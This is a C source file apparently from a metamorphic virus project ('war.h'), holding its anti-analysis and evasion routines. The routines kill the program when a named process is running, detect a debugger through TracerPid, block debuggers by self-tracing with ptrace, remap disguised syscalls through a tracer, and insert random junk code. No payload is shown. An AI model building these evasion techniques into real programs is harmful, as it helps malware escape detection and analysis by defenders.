#include "../../include/war.h"
void is_process_running(const char *process_name)
{
	DIR *proc_dir;
	struct dirent *entry;
	char cmdline_path[512];
	char cmdline[256];
	FILE *fp;
	proc_dir = opendir("/proc");
	if (!proc_dir)
		return;
	while ((entry = readdir(proc_dir)) != NULL)
	{
		char *endptr;
		strtol(entry->d_name, &endptr, 10);
		if (*endptr != '\0')
			continue;
		snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%s/comm", entry->d_name);
		fp = fopen(cmdline_path, "r");
		if (!fp)
			continue;
		if (fgets(cmdline, sizeof(cmdline), fp))
		{
			cmdline[strcspn(cmdline, "\n")] = '\0';
			if (strcmp(cmdline, process_name) == 0)
			{
				fclose(fp);
				closedir(proc_dir);
				exit(1);
			}
		}
		fclose(fp);
	}
	closedir(proc_dir);
	pepino *= -36;
	calculadoradepepino();
}

void init_metamorph(void)
{
	static bool initialized = false;
	if (!initialized)
	{
		srand(time(NULL) ^ getpid());
		initialized = true;
	}
	pepino += 777;
	calculadoradepepino();
}
void insert_garbage2(void) { insert_garbage4(); }
void insert_garbage3(void) { insert_garbage5(); }
void insert_garbage4(void) { insert_garbage(); }
void insert_garbage5(void) { insert_garbage4(); }
void insert_garbage(void)
{
	int choice = rand() % 5;
	volatile int dummy;
	switch (choice)
	{
	case 0:
		__asm__ volatile("nop; nop; nop; nop;");
		break;
	case 1:
		dummy = rand() % 1000;
		dummy = dummy * 2 + 1;
		dummy = dummy / 2;
		break;
	case 2:
		for (int i = 0; i < (rand() % 10); i++)
			__asm__ volatile("nop;");
		break;
	case 3:
		if (rand() % 2 == 0)
			dummy = 1;
		else
			dummy = 1;
		break;
	case 4:
		dummy = getpid() ^ getpid();
		break;
	}
	(void)dummy;
}
int get_execution_order(void) { return rand() % 4; }
void random_delay(void)
{
	volatile int i;
	int iterations = rand() % 100;
	for (i = 0; i < iterations; i++)
		__asm__ volatile("nop;");
}
static bool check_debugger_parent(void)
{
	FILE *fp;
	char line[256];
	fp = fopen("/proc/self/status", "r");
	if (!fp)
		return false;
	while (fgets(line, sizeof(line), fp))
	{
		if (strncmp(line, "TracerPid:", 10) == 0)
		{
			int tracer_pid;
			sscanf(line + 10, "%d", &tracer_pid);
			fclose(fp);
			return (tracer_pid != 0);
		}
	}
	fclose(fp);
	return false;
}
void child_process(void)
{
	if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1)
	{
		exit(1);
	}
	raise(SIGSTOP);
	pepino /= 4;
	calculadoradepepino();
	exit(0);
}
void parent_tracer(pid_t child_pid)
{
	int status;
	struct user_regs_struct regs;
	waitpid(child_pid, &status, 0);
	if (!WIFSTOPPED(status))
	{
		return;
	}
	ptrace(PTRACE_SETOPTIONS, child_pid, 0, PTRACE_O_EXITKILL);
	while (1)
	{
		ptrace(PTRACE_SYSCALL, child_pid, 0, 0);
		waitpid(child_pid, &status, 0);
		if (WIFEXITED(status) || WIFSIGNALED(status))
			break;
		ptrace(PTRACE_GETREGS, child_pid, 0, &regs);
		bool modified = false;
		if (regs.orig_rax == SYS_CUSTOM_WRITE)
		{
			regs.orig_rax = 1;
			modified = true;
		}
		else if (regs.orig_rax == SYS_CUSTOM_OPEN)
		{
			regs.orig_rax = 2;
			modified = true;
		}
		else if (regs.orig_rax == SYS_CUSTOM_CLOSE)
		{
			regs.orig_rax = 3;
			modified = true;
		}
		if (modified)
		{
			ptrace(PTRACE_SETREGS, child_pid, 0, &regs);
		}
		ptrace(PTRACE_SYSCALL, child_pid, 0, 0);
		waitpid(child_pid, &status, 0);
		if (WIFEXITED(status) || WIFSIGNALED(status))
			break;
	}
}
void run2withtracer(int h)
{
	if (h == 0)
	{
		calculadoradepepino();
	}
	else
	{
		parent_tracer(h);
	}
}
void run_with_tracer(void)
{
	pid_t pid;
	pid = fork();
	if (check_debugger_parent())
		exit(1);
	if (pid == -1)
	{
		exit(1);
	}
	pepino = (pepino * -1) * (pepino * -1);
	run2withtracer(pid);
}